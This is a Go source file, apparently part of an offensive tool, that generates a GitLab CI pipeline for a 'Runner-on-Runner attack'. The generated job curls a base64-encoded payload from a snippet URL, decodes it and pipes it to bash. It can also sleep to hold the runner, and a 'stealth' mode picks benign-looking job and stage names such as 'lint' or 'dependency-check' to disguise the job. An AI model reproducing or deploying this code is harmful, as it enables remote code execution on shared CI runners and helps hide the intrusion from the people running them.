package ror

import (
	"fmt"
	"math/rand"
	"strings"
)

var benignJobNames = []string{
	"lint", "code-quality", "dependency-check",
	"static-analysis", "validate-config",
}

var benignStageNames = []string{
	"test", "validate", "check", "lint",
}

// GeneratePipelineYAML generates .gitlab-ci.yml for the Runner-on-Runner attack.
//
// The payload is delivered via a GitLab snippet URL containing a base64-encoded script.
// The generated YAML curls the snippet, decodes it, and executes it.
//
// Naming priority:
//  1. Explicit jobName/stageName (highest)
//  2. stealth=true -> random from benign lists
//  3. Defaults: build_job / build
func GeneratePipelineYAML(snippetURL string, runnerTags []string, stealth bool,
	jobName, stageName string, persistMinutes int) string {

	// Determine job name
	jName := "build_job"
	if jobName != "" {
		jName = jobName
	} else if stealth {
		jName = benignJobNames[rand.Intn(len(benignJobNames))]
	}

	// Determine stage name
	sName := "build"
	if stageName != "" {
		sName = stageName
	} else if stealth {
		sName = benignStageNames[rand.Intn(len(benignStageNames))]
	}

	// Build script lines
	scriptLine := fmt.Sprintf("    - curl -s %s | base64 -d | bash", snippetURL)
	var persistLine string
	if persistMinutes > 0 {
		persistLine = fmt.Sprintf("\n    - sleep %d", persistMinutes*60)
	}

	// Build tags section
	var tagsYAML string
	if len(runnerTags) > 0 {
		var b strings.Builder
		b.WriteString("  tags:\n")
		for _, tag := range runnerTags {
			b.WriteString(fmt.Sprintf("    - %s\n", tag))
		}
		tagsYAML = b.String()
	}

	return fmt.Sprintf(`stages:
  - %s

%s:
  stage: %s
%s  script:
%s%s
`, sName, jName, sName, tagsYAML, scriptLine, persistLine)
}
